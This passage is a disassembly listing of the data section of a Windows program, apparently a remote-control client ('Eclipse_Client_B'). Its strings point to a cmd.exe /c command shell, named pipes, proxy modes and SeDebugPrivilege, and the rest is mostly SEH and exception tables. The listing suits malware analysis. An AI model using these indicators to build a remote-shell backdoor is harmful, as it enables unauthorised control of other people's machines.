                db 'Connect named pipe error:%d',0
                align 10h
aCl             db 'cl',0               ; DATA XREF: sub_407040+2F↑o
                                        ; sub_407110+64↑o ...
                align 4
aExit           db 'exit',0             ; DATA XREF: sub_407040+79↑o
                                        ; sub_407620+1A5↑o
                align 4
aCd             db 'cd',0               ; DATA XREF: sub_407110+AE↑o
                align 10h
dword_422740    dd 2E646D63h            ; DATA XREF: sub_407110+298↑r
dword_422744    dd 20657865h            ; DATA XREF: sub_407110+29E↑r
dword_422748    dd 20632Fh              ; DATA XREF: sub_407110+2A6↑r
unk_42274C      db  54h ; T             ; DATA XREF: sub_407940+558↑o
                db  41h ; A
                db  52h ; R
                db    0
unk_422750      db  53h ; S             ; DATA XREF: sub_407940+6A7↑o
                db  49h ; I
                db  50h ; P
                db    0
unk_422754      db  4Dh ; M             ; DATA XREF: sub_407940+7F4↑o
                db  52h ; R
                db  4Bh ; K
                db    0
unk_422758      db  50h ; P             ; DATA XREF: sub_407940+8D3↑o
                db  58h ; X
                db  59h ; Y
                db    0
unk_42275C      db  42h ; B             ; DATA XREF: sub_407940:loc_4082D3↑o
                db  50h ; P
                db  53h ; S
                db    0
unk_422760      db  54h ; T             ; DATA XREF: sub_407940:loc_408393↑o
                db  4Ch ; L
                db  53h ; S
                db    0
aDirect         db 'DIRECT',0           ; DATA XREF: sub_407940:loc_4083FE↑o
                align 4
aMapSetTTooLong db 'map/set<T> too long',0
                                        ; DATA XREF: sub_4092F0+3A↑o
aVectorTTooLong db 'vector<T> too long',0
                                        ; DATA XREF: sub_409D40+2B↑o
                                        ; sub_40A3B0+25↑o
                align 4
aDequeTTooLong  db 'deque<T> too long',0
                                        ; DATA XREF: sub_40A940+2B↑o
                align 4
aInvalidMapSetT db 'invalid map/set<T> iterator',0
                                        ; DATA XREF: sub_40AA20+35↑o
aD24s           db '-%d',9,'%-24s',0    ; DATA XREF: sub_40D8D0+ED↑o
                align 10h
aSS_0           db '%s\%s',0Ah,0        ; DATA XREF: sub_40D8D0+16F↑o
                align 4
aS_1            db '%s',0Ah,0           ; DATA XREF: sub_40D8D0+186↑o
; CHAR ProcName[]
ProcName        db 'NtQuerySystemInformation',0
                                        ; DATA XREF: sub_405710+60↑o
                                        ; sub_405850+53↑o
                align 4
; CHAR ModuleName[]
ModuleName      db 'ntdll.dll',0        ; DATA XREF: sub_405710+65↑o
                                        ; sub_405850+58↑o
                align 4
; CHAR aSedebugprivile[]
aSedebugprivile db 'SeDebugPrivilege',0 ; DATA XREF: sub_40DAD0+2B↑o
                                        ; sub_40DD30+A9↑o ...
                align 4
; CHAR szVersion[]
szVersion       db 'HTTP/1.0',0         ; DATA XREF: sub_401E10+123↑o
                                        ; sub_401E10+1E8↑o ...
                align 4
aSS             db '%s: %s',0           ; DATA XREF: sub_401E10+296↑o
                                        ; sub_401E10+2EA↑o ...
                align 10h
dbl_422830      dq 60.0                 ; DATA XREF: sub_4065E0+42↑r
__load_config_used dd 48h               ; Size
                dd 0                    ; Time stamp
                dw 2 dup(0)             ; Version: 0.0
                dd 0                    ; GlobalFlagsClear
                dd 0                    ; GlobalFlagsSet
                dd 0                    ; CriticalSectionDefaultTimeout
                dd 0                    ; DeCommitFreeBlockThreshold
                dd 0                    ; DeCommitTotalFreeThreshold
                dd 0                    ; LockPrefixTable
                dd 0                    ; MaximumAllocationSize
                dd 0                    ; VirtualMemoryThreshold
                dd 0                    ; ProcessAffinityMask
                dd 0                    ; ProcessHeapFlags
                dw 0                    ; CSDVersion
                dw 0                    ; Reserved1
                dd 0                    ; EditList
                dd offset ___security_cookie ; SecurityCookie
                dd offset ___safe_se_handler_table ; SEHandlerTable
                dd 36h                  ; SEHandlerCount
; Debug information (IMAGE_DEBUG_TYPE_CODEVIEW)
asc_422880      db 'RSDS'               ; DATA XREF: .rdata:00420254↑o
                                        ; CV signature
                dd 0C7F4F85h            ; Data1 ; GUID
                dw 3D31h                ; Data2
                dw 47F6h                ; Data3
                db 8Dh, 0FFh, 0D2h, 71h, 79h, 8, 0DAh, 0B8h; Data4
                dd 1                    ; Age
                db 'E:\XiaoME\SunCloud-Code\Eclipse_A\Release\Eclipse_Client_B.pdb',0 ; PdbFileName
                align 4
unk_4228D8      db    0                 ; DATA XREF: .rdata:004202B4↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_42AA14
                dd offset unk_422AB8
unk_4228EC      db    0                 ; DATA XREF: .rdata:004202D4↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_425014
                dd offset unk_422900
unk_422900      db    0                 ; DATA XREF: .rdata:004228FC↑o
                                        ; .rdata:00422930↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                dd offset off_422910
off_422910      dd offset off_422918    ; DATA XREF: .rdata:0042290C↑o
                align 8
off_422918      dd offset off_425014    ; DATA XREF: .rdata:off_422910↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422900
unk_422934      db    0                 ; DATA XREF: .rdata:00420AF8↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_425DB4
                dd offset unk_422948
unk_422948      db    0                 ; DATA XREF: .rdata:00422944↑o
                                        ; .rdata:0042297C↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                dd offset off_422958
off_422958      dd offset off_422964    ; DATA XREF: .rdata:00422954↑o
                dd offset off_422A9C
                db    0
                db    0
                db    0
                db    0
off_422964      dd offset off_425DB4    ; DATA XREF: .rdata:off_422958↑o
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422948
unk_422980      db    0                 ; DATA XREF: .rdata:00420280↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_42AA30
                dd offset unk_422994
unk_422994      db    0                 ; DATA XREF: .rdata:00422990↑o
                                        ; .rdata:004229CC↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    3
                db    0
                db    0
                db    0
                dd offset off_4229A4
off_4229A4      dd offset off_4229B4    ; DATA XREF: .rdata:004229A0↑o
                dd offset off_422A50
                dd offset off_422A9C
                db    0
                db    0
                db    0
                db    0
off_4229B4      dd offset off_42AA30    ; DATA XREF: .rdata:off_4229A4↑o
                db    2
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422994
unk_4229D0      db    0                 ; DATA XREF: .rdata:00420274↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_42AA70
                dd offset unk_4229E4
unk_4229E4      db    0                 ; DATA XREF: .rdata:004229E0↑o
                                        ; .rdata:00422A1C↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    3
                db    0
                db    0
                db    0
                dd offset off_4229F4
off_4229F4      dd offset off_422A04    ; DATA XREF: .rdata:004229F0↑o
                dd offset off_422A50
                dd offset off_422A9C
                db    0
                db    0
                db    0
                db    0
off_422A04      dd offset off_42AA70    ; DATA XREF: .rdata:off_4229F4↑o
                db    2
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_4229E4
unk_422A20      db    0                 ; DATA XREF: .rdata:00420268↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_42AA50
                dd offset unk_422A34
unk_422A34      db    0                 ; DATA XREF: .rdata:00422A30↑o
                                        ; .rdata:00422A68↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                dd offset off_422A44
off_422A44      dd offset off_422A50    ; DATA XREF: .rdata:00422A40↑o
                dd offset off_422A9C
                align 10h
off_422A50      dd offset off_42AA50    ; DATA XREF: .rdata:004229A8↑o
                                        ; .rdata:004229F8↑o ...
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422A34
unk_422A6C      db    0                 ; DATA XREF: .rdata:0042025C↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_42AA90
                dd offset unk_422A80
unk_422A80      db    0                 ; DATA XREF: .rdata:00422A7C↑o
                                        ; .rdata:00422AE8↓o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                dd offset off_422A90
off_422A90      dd offset off_422AD0    ; DATA XREF: .rdata:00422A8C↑o
                dd offset off_422A9C
                db    0
                db    0
                db    0
                db    0
off_422A9C      dd offset off_42AA14    ; DATA XREF: .rdata:0042295C↑o
                                        ; .rdata:004229AC↑o ...
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422AB8
unk_422AB8      db    0                 ; DATA XREF: .rdata:004228E8↑o
                                        ; .rdata:00422AB4↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                dd offset off_422AC8
off_422AC8      dd offset off_422A9C    ; DATA XREF: .rdata:00422AC4↑o
                align 10h
off_422AD0      dd offset off_42AA90    ; DATA XREF: .rdata:off_422A90↑o
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db    0
                db    0
                db    0
                dd offset unk_422A80
                align 10h
___safe_se_handler_table dd rva sub_41043A
                                        ; DATA XREF: .rdata:00422878↑o
                dd rva sub_410544
                dd rva SEH_40DB70
                dd rva sub_413BE0
                dd rva sub_41AA7C
                dd rva loc_41E668
                dd rva loc_41E683
                dd rva SEH_40A7D0
                dd rva SEH_4091F0
                dd rva SEH_401240
                dd rva SEH_4010D0
                dd rva SEH_40AEF0
                dd rva SEH_40A730
                dd rva SEH_404E40
                dd rva SEH_4041F0
                dd rva SEH_40B6B0
                dd rva SEH_40B4E0
                dd rva SEH_40B0E0
                dd rva SEH_40AA20
                dd rva SEH_40A3B0
                dd rva SEH_40A940
                dd rva SEH_408F30
                dd rva SEH_408740
                dd rva SEH_408630
                dd rva SEH_4084B0
                dd rva SEH_407940
                dd rva SEH_407620
                dd rva SEH_406A40
                dd rva SEH_4064E0
                dd rva SEH_4062E0
                dd rva SEH_405F00
                dd rva SEH_405850
                dd rva SEH_405710
                dd rva SEH_4050B0
                dd rva SEH_404BF0
                dd rva SEH_403980
                dd rva SEH_403800
                dd rva SEH_403630
                dd rva sub_41EE36
                dd rva SEH_402A00
                dd rva SEH_40B050
                dd rva SEH_40A030
                dd rva SEH_407110
                dd rva SEH_406C90
                dd rva SEH_4067C0
                dd rva SEH_406690
                dd rva SEH_405C60
                dd rva SEH_4052B0
                dd rva SEH_4027B0
                dd rva SEH_401E10
                dd rva SEH_40B900
                dd rva SEH_40B580
                dd rva SEH_4099D0
                dd rva SEH_403F70
                db    0
                db    0
                db    0
                db    0
unk_422BCC      db    0                 ; DATA XREF: sub_417AA8+3↑o
                                        ; sub_417AA8+8↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_422BD4      db    0                 ; DATA XREF: .text:00417AD1↑o
                                        ; .text:00417AD6↑o
                db    0
                db    0
                db    0
stru_422BD8     UnwindMapEntry <-1, offset sub_41E660>
                                        ; DATA XREF: .rdata:stru_422BE0↓o
stru_422BE0     FuncInfo <19930522h, 1, offset stru_422BD8, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: sub_40E26B+1040E↑o
                db    0
                db    0
                db    0
                db    0
stru_422C08     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40E919+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40E919
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40E94F    ; ScopeRecord.HandlerFunc
                align 8
stru_422C28     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40E9A9+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40E9A9
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset unk_40E9CA    ; ScopeRecord.FilterFunc
                dd offset loc_40E9DE    ; ScopeRecord.HandlerFunc
                align 8
stru_422C48     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40EC8A+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40EC8A
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40ED44    ; ScopeRecord.HandlerFunc
                align 8
stru_422C68     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40F074+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40F074
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40F100    ; ScopeRecord.HandlerFunc
                align 8
stru_422C88     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40F345+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40F345
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40F3BD    ; ScopeRecord.HandlerFunc
                align 8
stru_422CA8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40F564+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40F564
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40F5C8    ; ScopeRecord.HandlerFunc
                align 8
stru_422CC8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40F65C+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40F65C
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40F6D7    ; ScopeRecord.HandlerFunc
                align 8
stru_422CE8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40F867+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40F867
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40F8D8    ; ScopeRecord.HandlerFunc
                align 8
stru_422D08     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40FD55+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40FD55
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40FDAB    ; ScopeRecord.HandlerFunc
                align 8
stru_422D28     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40FDE3+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40FDE3
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40FE29    ; ScopeRecord.HandlerFunc
                align 8
stru_422D48     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40FEFC+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40FEFC
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41003A    ; ScopeRecord.HandlerFunc
                align 8
unk_422D68      db 0FEh ; þ             ; DATA XREF: start-150↑o
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db 0CCh ; Ì
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db 0FEh ; þ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                dd offset sub_410254
                dd offset sub_410268
                align 8
stru_422D88     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41191F+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41191F
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_4119B7    ; ScopeRecord.HandlerFunc
                align 8
stru_422DA8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_411C24+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 411C24
                dd 0FFFFFFCCh           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_411D85    ; ScopeRecord.HandlerFunc
                align 8
stru_422DC8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41208B+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41208B
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_4120F5    ; ScopeRecord.HandlerFunc
                align 8
stru_422DE8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4122A5+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4122A5
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412374    ; ScopeRecord.HandlerFunc
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412383    ; ScopeRecord.HandlerFunc
stru_422E10     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41241F+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41241F
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412536    ; ScopeRecord.HandlerFunc
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412542    ; ScopeRecord.HandlerFunc
stru_422E38     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_412C92+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 412C92
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412D24    ; ScopeRecord.HandlerFunc
                align 8
stru_422E58     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_412EA9+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 412EA9
                dd 0FFFFFFC8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_412FBD    ; ScopeRecord.HandlerFunc
                align 8
stru_422E78     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4132F0+7↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4132F0
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_41337B    ; ScopeRecord.FilterFunc
                dd offset loc_41338F    ; ScopeRecord.HandlerFunc
                align 8
stru_422E98     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_413A18+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 413A18
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_413B44    ; ScopeRecord.HandlerFunc
                align 8
stru_422EB8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_414448+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 414448
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41453B    ; ScopeRecord.HandlerFunc
                align 8
stru_422ED8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_414FE8+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 414FE8
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_4150BA    ; ScopeRecord.HandlerFunc
                align 8
stru_422EF8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_415174+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 415174
                dd 0FFFFFFCCh           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_415245    ; ScopeRecord.HandlerFunc
                dd 0                    ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_415211    ; ScopeRecord.HandlerFunc
stru_422F20     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_415257+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 415257
                dd 0FFFFFF8Ch           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_415494    ; ScopeRecord.FilterFunc
                dd offset loc_415498    ; ScopeRecord.HandlerFunc
                align 10h
stru_422F40     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_415520+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 415520
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_4155F2    ; ScopeRecord.HandlerFunc
                align 10h
stru_422F60     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_415E1F+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 415E1F
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_415E86    ; ScopeRecord.HandlerFunc
                align 10h
stru_422F80     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_415FB4+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 415FB4
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_416077    ; ScopeRecord.HandlerFunc
                align 10h
stru_422FA0     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4162DD+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4162DD
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41636F    ; ScopeRecord.HandlerFunc
                align 10h
stru_422FC0     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4163A4+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4163A4
                dd 0FFFFFFC8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_416535    ; ScopeRecord.HandlerFunc
                dd 0                    ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_416471    ; ScopeRecord.HandlerFunc
stru_422FE8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4166A8+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4166A8
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_4166C5    ; ScopeRecord.FilterFunc
                dd offset loc_4166E1    ; ScopeRecord.HandlerFunc
                align 8
stru_423008     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_416850+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 416850
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41690A    ; ScopeRecord.HandlerFunc
                align 8
stru_423028     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_417C82+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 417C82
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_417D42    ; ScopeRecord.HandlerFunc
                dd 0                    ; ScopeRecord.EnclosingLevel
                dd offset loc_417D04    ; ScopeRecord.FilterFunc
                dd offset loc_417D0E    ; ScopeRecord.HandlerFunc
stru_423050     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_417DA8+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 417DA8
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_417DEB    ; ScopeRecord.FilterFunc
                dd offset loc_417DF4    ; ScopeRecord.HandlerFunc
stru_42306C     HandlerType <40h, 0, 0, offset sub_417ED2>
                                        ; DATA XREF: .rdata:stru_42308C↓o
